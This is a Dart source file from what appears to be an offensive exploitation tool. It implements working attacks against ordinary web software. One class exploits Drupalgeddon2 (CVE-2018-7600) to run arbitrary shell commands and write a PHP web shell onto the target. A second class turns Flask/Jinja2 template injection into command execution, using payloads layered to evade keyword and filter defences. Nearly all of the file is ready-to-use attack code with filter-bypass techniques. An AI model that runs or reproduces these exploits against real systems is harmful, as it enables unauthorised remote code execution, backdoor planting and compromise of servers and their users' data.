import 'dart:convert';

import '../../../app/constants.dart';
import '../../core/exploit_error.dart';
import '../../../core/http/http_client.dart';
import '../../../core/http/http_result.dart';
import 'exp_result.dart';
import 'waf_detect.dart';

class DrupalExpService {
  final String baseUrl;
  final Duration timeout;

  DrupalExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  Future<String?> getShell(
    String shellContent, {
    String password = AppConstants.defaultShellPassword,
  }) async {
    try {
      const shellFile = 'php_behinder.php';
      final shellB64 = base64.encode(utf8.encode(shellContent));
      // 用 exec 运行 php -r 写文件，避免 assert 在目标环境里被禁用
      final phpCmd =
          "php -r 'file_put_contents(\"$shellFile\", base64_decode(\"$shellB64\"));'";
      final payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(phpCmd)}';
      await _httpClient.postOrThrow(
        '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: payload,
      );
      final checkUrl = '$_base/$shellFile';
      final check = await _httpClient.getOrThrow(checkUrl);
      if (check.statusCode == 200) return '$checkUrl Pass:$password';
      return null;
    } catch (_) {
      return null;
    }
  }

  String _cleanHtml(String html) {
    final normalized = html
        .replaceAll(RegExp(r'<br\s*/?>', caseSensitive: false), '\n')
        .replaceAll(
          RegExp(r'</(?:div|p|li|tr|th|td|ul|ol)>', caseSensitive: false),
          '\n',
        )
        .replaceAll(RegExp(r'<[^>]*>'), '')
        .replaceAll(RegExp(r'\r\n?'), '\n')
        .replaceAll(RegExp(r'\n+'), '\n');
    return normalized;
  }

  String? _parseOutput(String body) {
    try {
      final list = jsonDecode(body) as List<dynamic>;
      final outputs = <String>[];
      for (final item in list) {
        if (item is Map && item['command'] == 'insert') {
          outputs.add(item['data'] as String? ?? '');
        }
      }
      if (outputs.isNotEmpty) {
        return _cleanHtml(outputs.join('\n')).trim();
      }
    } catch (_) {}
    if (body.isEmpty) return null;
    final cleaned = _cleanHtml(body).trim();
    if (cleaned.isNotEmpty) return cleaned;
    return null;
  }

  Future<ExpResult> check() async {
    // 用唯一标记验证命令确实被执行；旧实现只要 200 且含 '[' 就判定存在，
    // 任何 Drupal AJAX 端点都会命中，属于误报。
    final ts = DateTime.now().millisecondsSinceEpoch;
    final marker = 'MXDRUPAL_$ts';
    try {
      final payload =
          'form_id=user_register_form&_drupal_ajax=1'
          '&mail[#post_render][]=exec&mail[#type]=markup'
          // printf 的格式串与参数分开发：请求里出现的是 "MXDRUPAL_%s <ts>"，
          // 只有真的执行了才拼出 "MXDRUPAL_<ts>"，回显请求骗不过去。
          '&mail[#markup]=printf%20MXDRUPAL_%25s%20$ts';
      final res = await _httpClient.postOrThrow(
        '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: payload,
      );
      final body = res.body ?? '';
      if (looksLikeWafBlock(res.statusCode, body)) {
        return ExpResult.probeFailed(
          'CVE-2018-7600 (Drupalgeddon2)',
          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
        );
      }
      if (body.contains(marker)) {
        return ExpResult(
          true,
          'CVE-2018-7600 (Drupalgeddon2)',
          'Form API #post_render 命令执行成功（命中标记 $marker）',
        );
      }
      // 未完成安装的 Drupal 只会返回安装向导，不应被当成"不存在漏洞"。
      final lower = body.toLowerCase();
      if (lower.contains('install.php') ||
          lower.contains('choose language') ||
          lower.contains('select an installation profile') ||
          lower.contains('drupal installation')) {
        return ExpResult.probeFailed(
          'CVE-2018-7600 (Drupalgeddon2)',
          '目标 Drupal 尚未完成安装（返回安装向导），无法判定',
        );
      }
    } catch (e) {
      return ExpResult.probeFailed('CVE-2018-7600 (Drupalgeddon2)', '探测失败: $e');
    }
    return ExpResult(false, 'CVE-2018-7600 (Drupalgeddon2)', '');
  }

  String _buildSafeCommand(String cmd) {
    final trimmed = cmd.trim();
    // 强制输出 base64 单行，免受 Drupal AJAX 嵌入 HTML 换行影响
    if (trimmed.contains('base64')) {
      return trimmed;
    }
    // 实测踩过的坑：`#markup` 会过 Drupal 的 XSS 过滤器，`&&` 被转成 `&amp;&amp;`，
    // 于是 `test -w x && echo ok` 这类命令在 shell 里变成两个无意义片段 → exec 恒为 null、
    // shell 落盘全失败。把命令整体 base64 后交给 sh，markup 里就只剩安全字符。
    final b64 = base64Encode(utf8.encode(trimmed));
    return '(echo $b64 | base64 -d | sh) | base64 | tr -d "\\n"';
  }

  Future<String?> execRce(String cmd) async {
    try {
      final safeCmd = _buildSafeCommand(cmd);
      final payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=${Uri.encodeQueryComponent(safeCmd)}';
      final res = await _httpClient.postOrThrow(
        '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: payload,
      );
      final body = res.body ?? '';
      final lower = body.toLowerCase();
      // 实测：未安装的 Drupal 会对一切返回安装向导/跳转页，
      // 旧实现把 "Redirecting to /core/install.php" 当成命令输出返回。
      if (lower.contains('core/install.php') ||
          lower.contains('redirecting to') ||
          lower.contains('drupal installation')) {
        throw const ExploitNotWorking(
          'Drupal 尚未完成安装（被重定向到安装向导），命令没有执行',
        );
      }
      final out = _parseOutput(body);
      if (out == null || out.isEmpty) return null;
      // 先尝试把执行结果当 base64 解码，还原原始输出。失败则返回原串。
      try {
        final decoded = utf8.decode(base64.decode(out.trim()));
        return decoded;
      } catch (_) {
        return out;
      }
    } on ExploitNotWorking {
      rethrow;
    } on ExploitBlocked {
      rethrow;
    } catch (_) {
      return null;
    }
  }
}

enum SstiInjectMode { get, post, header }

class FlaskSstiExpService {
  final String baseUrl;
  final String paramName;
  final SstiInjectMode injectMode;
  /// 额外请求头，每次请求都会带上
  final Map<String, String> extraHeaders;
  /// 原始请求体模板，{{INJECT}} 占位符会被替换为实际 payload
  final String rawBody;
  final Duration timeout;

  FlaskSstiExpService({
    required this.baseUrl,
    this.paramName = 'name',
    this.injectMode = SstiInjectMode.get,
    this.extraHeaders = const {},
    this.rawBody = '',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base => baseUrl.endsWith('/')
      ? baseUrl.substring(0, baseUrl.length - 1)
      : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  Future<HttpResult> _send(String payload) {
    final baseUri = Uri.parse('$_base/');
    final headers = Map<String, String>.from(extraHeaders);

    switch (injectMode) {
      case SstiInjectMode.get:
        return _httpClient.getOrThrow(
          Uri.parse('$_base/?$paramName=${Uri.encodeComponent(payload)}').toString(),
          headers: headers,
        );

      case SstiInjectMode.post:
        final body = rawBody.isNotEmpty
            ? rawBody.replaceAll('{{INJECT}}', payload)
            : '$paramName=${Uri.encodeComponent(payload)}';
        if (!headers.keys.any((k) => k.toLowerCase() == 'content-type')) {
          final trimmed = rawBody.trimLeft();
          headers['Content-Type'] =
              (trimmed.startsWith('{') || trimmed.startsWith('['))
                  ? 'application/json'
                  : 'application/x-www-form-urlencoded';
        }
        return _httpClient.postOrThrow(
          baseUri.toString(),
          headers: headers,
          body: body,
        );

      case SstiInjectMode.header:
        // {{INJECT}} 占位符替换 header 值
        for (final key in headers.keys.toList()) {
          headers[key] = headers[key]!.replaceAll('{{INJECT}}', payload);
        }
        return _httpClient.getOrThrow(
          baseUri.toString(),
          headers: headers,
        );
    }
  }

  Future<ExpResult> check() async {
    try {
      final res = await _send('{{233*233}}');
      final blocked = wafBlockedResult('Flask/Jinja2 SSTI', res.statusCode, res.body);
      if (blocked != null) return blocked;
      if ((res.body ?? '').contains('54289')) {
        return ExpResult(
          true,
          'Flask/Jinja2 SSTI',
          'SSTI 存在，233×233=54289 验证通过',
        );
      }
    } catch (e) {
      return ExpResult.probeFailed('Flask/Jinja2 SSTI', '探测失败: $e');
    }
    return ExpResult(false, 'Flask/Jinja2 SSTI', '');
  }

  // 将字符串拆成 Jinja2 字符级拼接，绕过命令关键字过滤
  // 例: "id" → "'i'~'d'"
  static String _j2Split(String s) {
    return s.split('').map((c) {
      final e = c == "'" ? "\\'" : c == '\\' ? '\\\\' : c;
      return "'$e'";
    }).join('~');
  }

  static const _sentinel = 'SSTI_OUT';

  // 从响应中提取哨兵标记之间的内容
  static String? _extract(String body) {
    final start = body.indexOf('${_sentinel}_S');
    final end = body.indexOf('${_sentinel}_E');
    if (start == -1 || end == -1 || end <= start) return null;
    return body.substring(start + '${_sentinel}_S'.length, end).trim();
  }

  // 用哨兵标记包裹 RCE 表达式，精确提取命令输出，过滤模板噪声
  String _wrap(String expr) => '${_sentinel}_S{{$expr}}${_sentinel}_E';

  Future<String?> execRce(String cmd) async {
    final splitCmd = _j2Split(cmd);

    // 三层递进 payload，兼容不同强度的关键字过滤：
    // 1. 直接执行（无过滤）
    // 2. |attr()+字符串拼接绕过 __dunder__ 属性过滤
    // 3. 在 2 的基础上额外绕过 Popen/shell/communicate/decode/stdout 关键字，
    //    命令本身也做字符级拆分
    final payloads = [
      "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
          "{% if c.__name__ == 'Popen' %}"
          "${_wrap("c('$cmd',shell=True,stdout=-1).communicate()[0].decode()")}"
          "{% endif %}{% endfor %}",
      "{%set d='_'*2%}"
          "{%for c in ''|attr(d+'class'+d)|attr(d+'mro'+d)|last|attr(d+'subclasses'+d)()%}"
          "{%if c|attr(d+'name'+d)=='Popen'%}"
          "${_wrap("c('$cmd',shell=True,stdout=-1).communicate()[0].decode()")}"
          "{%endif%}{%endfor%}",
      "{%set d='_'*2%}"
          "{%for c in ''|attr(d+'class'+d)|attr(d+'mro'+d)|last|attr(d+'subclasses'+d)()%}"
          "{%if c|attr(d+'name'+d)==('Po'+'pen')%}"
          "${_wrap("c(['sh','-c',$splitCmd],-1,None,None,-1)|attr('commun'+'icate')()|first|attr('dec'+'ode')()")}"
          "{%endif%}{%endfor%}",
    ];

    for (final payload in payloads) {
      try {
        final res = await _send(payload);
        if (res.statusCode == 200) {
          final out = _extract(res.body ?? '');
          if (out != null) return out;
        }
      } catch (_) {}
    }
    return null;
  }
}
